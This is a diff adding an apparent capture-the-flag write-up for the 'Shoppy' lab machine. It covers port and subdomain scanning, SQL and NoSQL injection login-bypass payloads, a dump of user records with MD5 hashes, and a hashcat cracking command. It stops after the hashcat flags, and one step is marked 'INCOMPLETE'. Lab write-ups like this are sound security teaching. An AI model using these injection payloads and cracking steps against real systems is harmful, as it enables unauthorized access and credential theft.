@@ -1,0 +1,162 @@
+# Shoppy
+
+### Machine IP
+```
+10.10.11.180
+```
+
+### nmap scan
+Scanning for open ports and services
+```
+nmap -sC -sV -Pn -T4 10.10.11.180
+```
+
+Results:
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA)
+|   256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA)
+|_  256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519)
+80/tcp open  http    nginx 1.23.1
+|_http-server-header: nginx/1.23.1
+|_http-title:             Shoppy Wait Page        
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Ports 22 (ssh) and 80 (http) are open!
+
+
+### gobuster scan
+Scanning for subdirectories
+```
+gobuster dir -w wordlists/dirbuster/directory-list-2.3-small.txt -u http://shoppy.htb
+```
+
+Results:
+```
+/images               (Status: 301) [Size: 179] [--> /images/]
+/login                (Status: 200) [Size: 1074]
+/admin                (Status: 302) [Size: 28] [--> /login]
+/assets               (Status: 301) [Size: 179] [--> /assets/]
+/css                  (Status: 301) [Size: 173] [--> /css/]
+/Login                (Status: 200) [Size: 1074]
+/js                   (Status: 301) [Size: 171] [--> /js/]
+/fonts                (Status: 301) [Size: 177] [--> /fonts/]
+/Admin                (Status: 302) [Size: 28] [--> /login]
+```
+
+### ffuf scan
+Scanning for subdomains
+
+```
+sudo ffuf -c -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://shoppy.htb -H "Host: FUZZ.shoppy.htb" --fc 301
+```
+
+Found one subdomain
+
+```
+mattermost              [Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 219ms]
+```
+
+### mattermost.shoppy.htb
+
+Adding to /etc/hosts in vim:
+```
+10.10.11.180	shoppy.htb mattermost.shoppy.htb
+```
+
+Seems to be another login form...
+
+### sqlmap
+Scanning the login page:
+```
+sqlmap -r post.txt -p username --level 5 --risk 3 --threads 10
+```
+
+Connection times out...ineffective
+
+### Manual sqli
+
+Attempting a login with:
+```
+Username: admin' or 1=1 --
+Password: admin
+```
+
+The username portion would resolve to:
+
+```
+SELECT * FROM users WHERE username = 'admin' OR 1=1-- ' 
+```
+
+...in the case of injection. The password really doesnt matter.
+
+
+Page taking a long time to load...
+Results in a 504 Gateway timeout
+
+Let's try NoSQLi
+
+### Manual NoSQLi
+
+Attempting a login with:
+```
+Username: admin'||'1==1
+Password: cheese
+```
+
+The username portion would resolve to:
+
+```
+INCOMPLETE
+```
+
+...in the case of injection. The password really doesnt matter.
+
+RESULT! We are logged in!
+
+
+### Exploring the Admin page
+Weve been redirected to:
+```
+http://shoppy.htb/admin
+```
+
+Here, we can search for users. So let's search for "admin'||'1==1".
+
+We get an exported json file with the information:
+```
+[
+  {
+    "_id": "62db0e93d6d6a999a66ee67a",
+    "username": "admin",
+    "password": "23c6877d9e2b564ef8b32c3a23de27b2"
+  },
+  {
+    "_id": "62db0e93d6d6a999a66ee67b",
+    "username": "josh",
+    "password": "6ebcea65320589ca4f2f1ce039975995"
+  }
+]
+```
+
+The passwords are stored as MD5 hashes...let crack them!
+
+### Hashcat
+
+Trying to crack the following hashes with hashcat...
+```
+23c6877d9e2b564ef8b32c3a23de27b2
+6ebcea65320589ca4f2f1ce039975995
+```
+
+Command:
+
+```
+hashcat -m 0 -a 0 -o cracked_hashes hashes /usr/share/wordlists/rockyou.txt
+```
+
+`-m`: type of hash (0 represents MD5)
+`-a`: type of attack (0 represents dictionary attack)
